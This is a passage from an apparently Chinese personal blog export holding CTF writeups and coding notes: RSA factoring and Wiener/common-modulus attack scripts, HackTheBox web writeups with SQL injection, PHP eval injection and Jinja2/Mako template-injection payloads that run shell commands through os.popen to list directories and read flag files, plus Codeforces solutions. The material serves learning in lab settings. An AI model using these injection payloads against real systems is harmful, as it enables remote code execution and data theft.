r).也就算说：对于任意的奇正整数$n$，只要我们可以找到2个数$s,r$，使得他们的平方差等于$n$，那么我们就可以得到$n$的两个因数。$\\square$ 因此我们可以考虑以下算法： 首先计算 $t := \\lceil \\sqrt{n} \\rceil$ 依次测试 $t^2-n, (t+1)^2-n,… $ 是否为平方数 如果是（即$r^2 = s^2-n$ ），则得到$n = (s-r)(s+r)$。 如果不是，则这个方法行不通。 注意，这个算法一定会终止，因为测试到$s = n+1$时： n = (\\frac{n+1}{2})^2 - (\\frac{n-1}{2})^2会得到$n = n\\cdot 1$（没有什么意义），但是在实际情况里我们不一定会让它跑完，因为太慢了。 代码实现： 1234567891011121314151617181920import mathdef fermat_factor(n, max_iter=1000000): a = math.isqrt(n) if a * a &lt; n: a += 1 for _ in range(max_iter): b2 = a*a - n b = math.isqrt(b2) if b*b == b2: return a - b, a + b a += 1 return Nonen = result = fermat_factor(n)if result: print(&quot;p =&quot;, result[0], &quot;q =&quot;, result[1])else: print(&quot;未成功&quot;) Pollard’s p-1适用于$n$有一个smooth factor $p$（即所有满足$q | (p-1)$的素数$q$都很小）的情况。 算法原理： 首先来回顾以下费马小定理： 费马小定理（Fermat’s Little Theorem）：设 $p$ 是一个素数，$a$ 是一个整数，且 $a$ 与 $p$ 互素（即 $(a, p) = 1$）。那么有： a^{p - 1} \\equiv 1 \\pmod{p} 我们现在假设$p$是$n$的一个素因数。如果我们能找到一个整数$k$使得$(p-1)|k!$，即存在一个$l$使得$(p-1)l=k!$，那么就有： 2^{k!} = 2^{(p-1)l} = (2^{p-1})^l \\equiv 1^l \\equiv 1 \\ \\ \\ \\text{ mod }p这意味着 $p|(2^{k!}-1)$，也就是说$p$是$2^{k!}-1$和$n$的一个共同的因数。 所以算法如下： 对于$k=1,2,3,…$我们计算 r_k := (2^{k!} \\ \\ \\text{ mod }n) 计算$M = \\text{gcd}(r^k-1,n)$： 如果等于1，则继续； 如果不等于1，那么$p$一定是$M$的一个因数。这时只需要对$M$进行质因数分解。 代码实现： 1234567891011121314151617import mathdef pollard_p1(n, B=1000000): a = 2 for j in range(2, B): a = pow(a, j, n) g = math.gcd(a-1, n) if 1 &lt; g &lt; n: return g, n // g return Nonen = result = pollard_p1(n)if result: print(&quot;p =&quot;, result[0], &quot;q =&quot;, result[1])else: print(&quot;未成功&quot;) The Elliptic Curve Factorization Method详细可见： https://doc.sagemath.org/html/en/reference/interfaces/sage/interfaces/ecm.html 我们可以直接使用sage的ecm.factor()函数。 例子： 1234from sage.all import *n = factors = ecm.factor(n)phi = prod([f - 1 for f in factors]) 低指数攻击低加密指数攻击适用于加密所选的e非常小的情况，比如说 e=3,5 之类的。 这个时候很有可能 $m^e &lt; 10^5 \\cdot n$，所以可以直接遍历。 代码示例： 123456789101112131415161718from gmpy2 import irootfrom Crypto.Util.number import long_to_bytese = n = c = # 可以根据条件以及测试结果调整max的大小max = 10000for i in range(1, max): modified_c = c + i * n m_root, exact = iroot(modified_c, e) if exact: print(f&quot;找到解: i = &#123;i&#125;&quot;) print(&quot;明文:&quot;, long_to_bytes(m_root)) breakelse: print(&quot;尝试范围内未找到可解的 m&quot;) 低解密指数攻击这种攻击适用于d特别小的情况。（当给的e非常大的时候都可以试一下这种方法。） Wiener’s Attack这个是基于连分数（Continued Fraction）的一种算法。适用于 $d &lt; \\frac{n^{1/4}}{3}$ 的情况。 代码示例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import mathfrom Crypto.Util.number import long_to_bytesdef continued_fraction(numerator, denominator): &quot;&quot;&quot;生成分数 numerator/denominator 的连分数表示&quot;&quot;&quot; cf = [] while denominator: a = numerator // denominator cf.append(a) numerator, denominator = denominator, numerator - a * denominator return cfdef convergents_from_cf(cf): &quot;&quot;&quot;根据连分数序列 cf 生成收敛分数 (k, d)&quot;&quot;&quot; n0, d0 = cf[0], 1 yield (n0, 1) if len(cf) == 1: return n1 = cf[1] * cf[0] + 1 d1 = cf[1] yield (n1, d1) for i in range(2, len(cf)): ni = cf[i] * n1 + n0 di = cf[i] * d1 + d0 yield (ni, di) n0, d0, n1, d1 = n1, d1, ni, didef is_perfect_square(x): &quot;&quot;&quot;判断 x 是否为完全平方数&quot;&quot;&quot; if x &lt; 0: return False s = math.isqrt(x) return s * s == xdef wiener_attack(e, n): &quot;&quot;&quot; 使用 Wiener 攻击尝试恢复 RSA 私钥 d。 参数: e: 公钥指数 n: 模数 返回: 若成功，返回私钥指数 d；否则返回 None。 &quot;&quot;&quot; cf = continued_fraction(e, n) for k, d in convergents_from_cf(cf): if k == 0: continue # 检查 (e*d - 1) 是否被 k 整除，以得到 phi if (e * d - 1) % k != 0: continue phi = (e * d - 1) // k # 计算方程 x^2 - (n - phi + 1)x + n = 0 的判别式 s = n - phi + 1 discr = s * s - 4 * n if discr &gt;= 0 and is_perfect_square(discr): t = math.isqrt(discr) # 计算 p, q p = (s + t) // 2 q = (s - t) // 2 if p * q == n: return d return Nonen = e = c = d = wiener_attack(e, n)if d: print(f&quot;得到d: &#123;d&#125;&quot;) m = pow(c, d, n) message = long_to_bytes(m).decode() print(f&quot;明文内容为：&#123;message&#125;&quot;)else: print(&quot;Wiener 攻击未能恢复 d&quot;) 共模攻击适用情况：同一条明文消息被用相同的模数但不同的指数加密多次。 共模攻击成立必须满足以下几个条件： 使用 RSA 加密的两个密文： c_1 = m^{e_1} \\mod n,\\quad c_2 = m^{e_2} \\mod n 两个密文 $c_1$ 和 $c_1$ 是使用相同的模数 n，但使用了不同的指数 e₁ 和 e₂加密得到的。 $e_1$ 和 $e_2$ 需要满足互质：$\\text{gcd}(e₁, e₂) = 1$。 攻击方法：使用扩展欧几里得算法（Extended Euclidean Algorithm） 当满足上述条件时，我们可以用扩展欧几里得算法找到整数 x 和 y，使得： x \\cdot e_1 + y \\cdot e_2 = 1然后便可计算出明文： m = \\Bigl((c_1^x \\cdot c_2^y) \\mod n \\Bigl)因为： (c_1^x \\cdot c_2^y) \\equiv (m^{e_1})^x \\cdot (m^{e_2})^y \\equiv m^{x \\cdot e_1 + y \\cdot e_2} \\equiv m\\mod n注意： 如果 x 或 y 为负数，则需要使用逆元（modular inverse）处理负指数： $ c^{-a} \\mod n = (c^{-1})^a \\mod n $ 代码示例： 123456789101112131415161718192021222324252627282930313233from Crypto.Util.number import inverse, long_to_bytesfrom math import gcdn = e1 = e2 = c1 = c2 = # 使用扩展欧几里得算法求出 x 和 ydef extended_gcd(a, b): if b == 0: return (1, 0) else: x1, y1 = extended_gcd(b, a % b) x = y1 y = x1 - (a // b) * y1 return (x, y)x, y = extended_gcd(e1, e2)# 处理负指数（计算逆元）if x &lt; 0: c1 = inverse(c1, n) x = -xif y &lt; 0: c2 = inverse(c2, n) y = -ym = (pow(c1, x, n) * pow(c2, y, n)) % n# 解密后的明文print(long_to_bytes(m))","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/tags/CTF/"},{"name":"RSA","slug":"RSA","permalink":"https://archer-baiyi.github.io/tags/RSA/"},{"name":"Fermat","slug":"Fermat","permalink":"https://archer-baiyi.github.io/tags/Fermat/"},{"name":"PEM","slug":"PEM","permalink":"https://archer-baiyi.github.io/tags/PEM/"},{"name":"CRT","slug":"CRT","permalink":"https://archer-baiyi.github.io/tags/CRT/"}]},{"title":"HTB Art Writeup","slug":"CTF/Misc/HTB-Art-Writeup","date":"2025-03-28T22:46:02.000Z","updated":"2025-04-02T21:33:27.623Z","comments":true,"path":"2025/03/28/CTF/Misc/HTB-Art-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Misc/HTB-Art-Writeup/","excerpt":"","text":"题目描述 会拿到一张这样的图片： 题解这是Piet，一种esolang（esoteric programming language）。（详见https://en.wikipedia.org/wiki/Esoteric_programming_language#Piet） 这道题就是很典型的“知道就很简单，不知道就完全没法做”。 可以用这个网站在线运行： https://www.bertnase.de/npiet/npiet-execute.php 然后得到flag：HTB{p137_m0ndr14n}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Misc","slug":"CTF/Misc","permalink":"https://archer-baiyi.github.io/categories/CTF/Misc/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Misc","slug":"Misc","permalink":"https://archer-baiyi.github.io/tags/Misc/"},{"name":"esolang","slug":"esolang","permalink":"https://archer-baiyi.github.io/tags/esolang/"},{"name":"Piet","slug":"Piet","permalink":"https://archer-baiyi.github.io/tags/Piet/"}]},{"title":"HTB-sanitize Writeup","slug":"CTF/Web/HTB-sanitize-Writeup","date":"2025-03-28T19:12:23.000Z","updated":"2025-04-02T21:32:15.403Z","comments":true,"path":"2025/03/28/CTF/Web/HTB-sanitize-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Web/HTB-sanitize-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网页： 随便输入个username和password会看到下方有一段SQL代码： 渗透猜测网页的登录逻辑是这样的：如果当前select成功（也就是说能在数据库里找到当前输入的账号信息），那么就可以登录成功。 所以直接SQL Injection，在username一栏输入 1admin&#x27; -- ，然后password那一栏输入任意内容（比如说1），就可以得到flag：HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"SQL","slug":"SQL","permalink":"https://archer-baiyi.github.io/tags/SQL/"},{"name":"SQL Injection","slug":"SQL-Injection","permalink":"https://archer-baiyi.github.io/tags/SQL-Injection/"}]},{"title":"HTB-LoveTok Writeup","slug":"CTF/Web/HTB-LoveTok-Writeup","date":"2025-03-28T10:30:49.000Z","updated":"2025-04-02T21:32:01.646Z","comments":true,"path":"2025/03/28/CTF/Web/HTB-LoveTok-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/28/CTF/Web/HTB-LoveTok-Writeup/","excerpt":"","text":"题目描述 （有附件） 观察打开网页： 当点击了下面那个按钮之后网页的url会增加一个参数： 1/?format=r 因为给的附件比较多，所以直接挨个搜索“format”，可以确定下来2份相关代码： 12345678910&lt;?phpclass TimeController&#123; public function index($router) &#123; $format = isset($_GET[&#x27;format&#x27;]) ? $_GET[&#x27;format&#x27;] : &#x27;r&#x27;; $time = new TimeModel($format); return $router-&gt;view(&#x27;index&#x27;, [&#x27;time&#x27; =&gt; $time-&gt;getTime()]); &#125;&#125; 这里会直接接收（没有过滤）我们传入的 format 的值，然后调用 TimeModel 处理这个值。 123456789101112131415161718&lt;?phpclass TimeModel&#123; public function __construct($format) &#123; $this-&gt;format = addslashes($format); # 把用户输入的 format 做了 addslashes() 处理，会把 &quot;, &#x27;, \\, NULL 这些内容前面加上反斜杠进行转义。 [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ]; $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;; &#125; public function getTime() &#123; eval(&#x27;$time = date(&quot;&#x27; . $this-&gt;format . &#x27;&quot;, strtotime(&quot;&#x27; . $this-&gt;prediction . &#x27;&quot;));&#x27;); return isset($time) ? $time : &#x27;Something went terribly wrong&#x27;; &#125;&#125; 注意，PHP 的 eval() 函数会把传入的字符串当作 PHP 代码来执行。所以这道题可以通过注入php代码（不能包含 %}，{% kbd ' %}，{% kbd %}，{% kbd NULL %}）来获取flag。 首先尝试 1/?format=$&#123;system(ls)&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"PHP","slug":"PHP","permalink":"https://archer-baiyi.github.io/tags/PHP/"},{"name":"PHP 代码注入","slug":"PHP-代码注入","permalink":"https://archer-baiyi.github.io/tags/PHP-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/"}]},{"title":"Codeforce Dragons","slug":"算法竞赛/Codeforce/1000/Codeforce-Dragons","date":"2025-03-28T10:15:13.000Z","updated":"2025-04-02T11:06:13.363Z","comments":true,"path":"2025/03/28/算法竞赛/Codeforce/1000/Codeforce-Dragons/","permalink":"https://archer-baiyi.github.io/2025/03/28/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Dragons/","excerpt":"","text":"题目描述 思路这道题的重点是可以自由挑选打龙的顺序，所以可以用vector来存储所有x，y的值，然后进行排序。 代码C++1234567891011121314151617181920212223242526272829303132#include &lt;iostream&gt;#include &lt;vector&gt;#include &lt;algorithm&gt; // for sortusing namespace std;int main() { int s, n; cin &gt;&gt; s &gt;&gt; n; vector&lt;pair&lt;int, int&gt;&gt; dragons(n); // 每条龙是一个(x, y)的vector for (int i = 0; i &lt; n; ++i) { cin &gt;&gt; dragons[i].first &gt;&gt; dragons[i].second; // first 是 x，second 是 y } // 按照龙的强度从小到大排序 // 默认先按照 pair 的 first 升序排列。如果 first 相等，再按照 second 升序排列 // begin和end会对所有内容进行排序。 sort(dragons.begin(), dragons.end()); for (int i = 0; i &lt; n; ++i) { if (s &gt; dragons[i].first) { s += dragons[i].second; // 赢了，加数值的奖励 } else { cout &lt;&lt; \"NO\" &lt;&lt; endl; return 0; } } cout &lt;&lt; \"YES\" &lt;&lt; endl; return 0;} 如果是降序的话需要写成 123sort(dragons.begin(), dragons.end(), [](pair&lt;int, int&gt; a, pair&lt;int, int&gt; b) { return a.first &gt; b.first;});","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"},{"name":"greedy","slug":"greedy","permalink":"https://archer-baiyi.github.io/tags/greedy/"},{"name":"sortings","slug":"sortings","permalink":"https://archer-baiyi.github.io/tags/sortings/"}]},{"title":"HTB Templated Writeup","slug":"CTF/Web/HTB-Templated-Writeup","date":"2025-03-27T20:02:53.000Z","updated":"2025-04-02T21:32:23.748Z","comments":true,"path":"2025/03/27/CTF/Web/HTB-Templated-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/27/CTF/Web/HTB-Templated-Writeup/","excerpt":"","text":"题目描述 （无附件） 观察打开网站会发现一片空白： 专门提示了是Jinja2，所以大概率是注入，而Jinja2注入的格式为 1{{ code }} （以下用server来指代当前网址） 因为没有给网页源代码，所以只能不断尝试。然后会发现当将当前url修改成 1server/{{7*7}} 时，会显示 可以看到 7*7 确实被执行了，所以确定这里就是注入口。 渗透有至少2种方法： 第一种通过模板中函数对象的 __globals__ 拿到全局作用域，然后借助 ____builtins__[__import__]__ 导入 os ，用 os.popen() 执行命令。 核心链路： 1234567891011self↓__init__ ← 模板函数对象↓__globals__ ← 函数的全局变量字典↓__builtins__['__import__'] ← 导入函数↓__import__('os') ← 导入 os 模块↓os.popen('命令').read() ← 执行命令并读取结果 按以下顺序注入： 1{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 或 1{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }} 确认了当前注入方式可行。 然后查找 flag 文件： 1{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}} 最后直接读取flag： 1{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }} 第二种使用这个模板来发起命令执行（RCE）攻击： 1{{ [].__class__.__base__.__subclasses__()[&lt;index&gt;].__init__.__globals__['os'].popen('id').read() }} （需要找到popen对应的index） 首先用 1{{ [].__class__.__base__.__subclasses__() }} 列出所有 subclasses，然后通过 12345{% for c in [].__class__.__base__.__subclasses__() %} {% if 'Popen' in c.__name__ %} {{ loop.index0 }}: {{ c }} {% endif %}{% endfor %} 找到 popen 的index： 通过尝试 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('id').read() }} 确认可以成功RCE。 接着就跟之前一样先找然后再读取flag： 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('ls').read() }} 1{{ [].__class__.__base__.__subclasses__()[414].__init__.__globals__['os'].popen('cat flag.txt').read() }} 拿到flag：HTB{t3mpl4t3s_4r3_m0r3_p0w3rfu1_th4n_u_th1nk!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Jinja2","slug":"Jinja2","permalink":"https://archer-baiyi.github.io/tags/Jinja2/"}]},{"title":"HTB Spookifier Writeup","slug":"CTF/Web/HTB-Spookifier-Writeup","date":"2025-03-27T17:16:33.000Z","updated":"2025-04-02T21:32:19.507Z","comments":true,"path":"2025/03/27/CTF/Web/HTB-Spookifier-Writeup/","permalink":"https://archer-baiyi.github.io/2025/03/27/CTF/Web/HTB-Spookifier-Writeup/","excerpt":"","text":"题目描述 （有附件） 解题观察打开网站： 输入 “abc“ 会看到： 然后我们来查看代码（routes.py）： 1234567891011121314from flask import Blueprint, requestfrom flask_mako import render_templatefrom application.util import spookifyweb = Blueprint('web', __name__)@web.route('/')def index(): text = request.args.get('text') if(text): converted = spookify(text) return render_template('index.html',output=converted) return render_template('index.html',output='') 可以看到网页会将我们的输入经过 sppokify() 函数转换一下再进行输出。 所以我们接着来查看 util.py ： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374from mako.template import Templatefont1 = { 'A': '𝕬', 'B': '𝕭', 'C': '𝕮', ...}font2 = { 'A': 'ᗩ', 'B': 'ᗷ', 'C': 'ᑢ', ...}font3 = { 'A': '₳', 'B': '฿', 'C': '₵', ...} font4 = { 'A': 'A', 'B': 'B', 'C': 'C', ...}# 注意，这里的font4收录了所有的字母数字以及符号，并没有做任何修改。def generate_render(converted_fonts): result = ''' &lt;tr&gt; &lt;td&gt;{0}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{1}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{2}&lt;/td&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt;{3}&lt;/td&gt; &lt;/tr&gt; '''.format(*converted_fonts) return Template(result).render()def change_font(text_list): text_list = [*text_list] current_font = [] all_fonts = [] add_font_to_list = lambda text,font_type : ( [current_font.append(globals()[font_type].get(i, ' ')) for i in text], all_fonts.append(''.join(current_font)), current_font.clear() ) and None add_font_to_list(text_list, 'font1') add_font_to_list(text_list, 'font2') add_font_to_list(text_list, 'font3') add_font_to_list(text_list, 'font4') return all_fontsdef spookify(text): converted_fonts = change_font(text_list=text) return generate_render(converted_fonts=converted_fonts) 可以看到定义了4种字体以及输出的页面格式。change_font() 和 spookify() 则负责转换字体。 假设我们输入了 ”input“，那么服务器按照以下流程来处理我们的输入： 接收我们的输入并赋值给 text： 1text = request.args.get('text') 调用 spookify(text)： 1converted = spookify(text) 123def spookify(text): converted_fonts = change_font(text_list=text) return generate_render(converted_fonts=converted_fonts) 最后再利用 generate_render() 创建模板： 123456789def generate_render(converted_fonts): result = ''' &lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{1}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt; &lt;tr&gt;&lt;td&gt;{3}&lt;/td&gt;&lt;/tr&gt; '''.format(*converted_fonts) return Template(result).render() 注意，因为 font4 完全不会修改我们输入的内容，所以我们输入的所以内容（包括各种特殊符号）都会保留下来并被渲染进 {3} 的位置。 漏洞+渗透这道题主要考察的是 Template Injection（模板注入）： 模板注入是指攻击者将恶意代码注入到模板引擎中，使模板引擎在渲染时执行攻击者控制的表达式，造成信息泄露、RCE（远程代码执行）等后果。 漏洞主要由这几部分一起构成： 没有对输入内容进行过滤； font4会保留我们的所有输入内容 使用 Template(…).render() 动态渲染字符串模板 Mako里刚好有表达式语法： 1${} 所以导致我们输入 1${7*7} 时，mako会在渲染这部分内容 1234&lt;tr&gt;&lt;td&gt;{0}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;{1}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;{2}&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;${7*7}&lt;/td&gt;&lt;/tr&gt; 时，执行我们的代码，即 ${7*7}。所以最后的渲染结果是： 1&lt;tr&gt;&lt;td&gt;49&lt;/td&gt;&lt;/tr&gt; 这样子就我们说明注入成功了，接下来就是考虑如何读取flag了。 因为Mako 的底层代码会把 ${ } 表达式里的内容编译成 Python 代码，然后直接执行。所以我们直接注入python代码即可。 首先尝试 1${__import__('os').popen('ls').read()} 其中 1.popen('ls') 会执行 ls 命令（默认是当前工作目录），而 1.read() 会把命令输出读取成字符串。 可以看到 意味着当前目录下没有flag。我们接着查看上一级目录里的内容： 1${__import__('os').popen('ls ..').read()} 成功找到 flag.txt 文件。最后直接读取就好： 1${__import__('os').popen('cat ../flag.txt').read()} 得到flag：HTB{t3mpl4t3_1nj3ct10n_C4n_3x1st5_4nywh343!!} 。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/categories/CTF/"},{"name":"Web","slug":"CTF/Web","permalink":"https://archer-baiyi.github.io/categories/CTF/Web/"}],"tags":[{"name":"Writeup","slug":"Writeup","permalink":"https://archer-baiyi.github.io/tags/Writeup/"},{"name":"HTB","slug":"HTB","permalink":"https://archer-baiyi.github.io/tags/HTB/"},{"name":"Web","slug":"Web","permalink":"https://archer-baiyi.github.io/tags/Web/"},{"name":"Injection","slug":"Injection","permalink":"https://archer-baiyi.github.io/tags/Injection/"},{"name":"Template Injection","slug":"Template-Injection","permalink":"https://archer-baiyi.github.io/tags/Template-Injection/"},{"name":"模板注入","slug":"模板注入","permalink":"https://archer-baiyi.github.io/tags/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"},{"name":"Mako","slug":"Mako","permalink":"https://archer-baiyi.github.io/tags/Mako/"}]},{"title":"Codeforce Chat room","slug":"算法竞赛/Codeforce/1000/Codeforce-Chat-room","date":"2025-03-27T12:13:26.000Z","updated":"2025-04-02T11:06:00.595Z","comments":true,"path":"2025/03/27/算法竞赛/Codeforce/1000/Codeforce-Chat-room/","permalink":"https://archer-baiyi.github.io/2025/03/27/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Chat-room/","excerpt":"","text":"题目描述 思路利用一个index/指针来逐个匹配目标字符串 “hello”。从j=0开始，如果找到了j就加一。如果最后j=5的话就说明找到了。 代码C++12345678910111213141516171819202122232425262728#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;int main() { string s; cin &gt;&gt; s; string target = \"hello\"; int j = 0; for (char c : s) { if (c == target[j]) { j++; } if (j == target.size()) { break; } } if (j == target.size()) { cout &lt;&lt; \"YES\" &lt;&lt; endl; } else { cout &lt;&lt; \"NO\" &lt;&lt; endl; } return 0;}","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"Codeforce Lucky Division","slug":"算法竞赛/Codeforce/1000/Codeforce-Lucky-Division","date":"2025-03-27T12:06:28.000Z","updated":"2025-04-02T11:06:22.990Z","comments":true,"path":"2025/03/27/算法竞赛/Codeforce/1000/Codeforce-Lucky-Division/","permalink":"https://archer-baiyi.github.io/2025/03/27/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/1000/Codeforce-Lucky-Division/","excerpt":"","text":"题目描述 思路写2个函数，第一个判断一个数是否是（严格的）lucky number，第二个函数遍历所有的lucky number判断是否是当前n的因数。 代码C++12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;// 判断一个数字是否是 lucky number（只含有 4 或 7）bool is_lucky(int num) { string s = to_string(num); // 比如说会把47转成\"47\" for (char c : s) { // 会遍历string中的每个字母 if (c != '4' &amp;&amp; c != '7') { return false; } } return true;}// 判断是否是 almost lucky numberstring is_almost_lucky(int n) { for (int i = 1; i &lt;= n; ++i) { if (is_lucky(i) &amp;&amp; n % i == 0) { return \"YES\"; } } return \"NO\";}int main() { int n; cin &gt;&gt; n; cout &lt;&lt; is_almost_lucky(n) &lt;&lt; endl; return 0;} Python12345678910111213def is_lucky(num): # 判断一个数字是不是 lucky number（只含 4 或 7） return all(c in '47' for c in str(num))def is_almost_lucky(n): # 枚举 1 到 n 的所有 lucky number for i in range(1, n + 1): if is_lucky(i) and n % i == 0: return \"YES\" return \"NO\"n = int(input())print(is_almost_lucky(n))","categories":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"算法竞赛/Codeforce","permalink":"https://archer-baiyi.github.io/categories/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/Codeforce/"}],"tags":[{"name":"算法竞赛","slug":"算法竞赛","permalink":"https://archer-baiyi.github.io/tags/%E7%AE%97%E6%B3%95%E7%AB%9E%E8%B5%9B/"},{"name":"Codeforce","slug":"Codeforce","permalink":"https://archer-baiyi.github.io/tags/Codeforce/"},{"name":"1000","slug":"1000","permalink":"https://archer-baiyi.github.io/tags/1000/"}]},{"title":"C++ 入门","slug":"编程/Cpp-入门","date":"2025-03-26T21:47:10.000Z","updated":"2025-03-26T22:40:07.069Z","comments":true,"path":"2025/03/26/编程/Cpp-入门/","permalink":"https://archer-baiyi.github.io/2025/03/26/%E7%BC%96%E7%A8%8B/Cpp-%E5%85%A5%E9%97%A8/","excerpt":"","text":"Hello World老规矩还是先见识一下输出“Hello World!”： 12345678#include &lt;iostream&gt;using namespace std;int main()&#123; cout &lt;&lt; &quot;Hello World!&quot;; return 0;&#125; 注意几点： #include 这一部分和c是一样的，但是后面的库的名字是不同的； using namespace std; 是为了不需要后面每次使用像 cout 时得写全成 std::cout 。而且记得一定要在后面加上 ;； cout 是c output，想输出什么东西都得按照 cout","categories":[{"name":"编程","slug":"编程","permalink":"https://archer-baiyi.github.io/categories/%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://archer-baiyi.github.io/tags/C/"},{"name":"cpp","slug":"cpp","permalink":"https://archer-baiyi.github.io/tags/cpp/"}]},{"title":"Codeforce-String 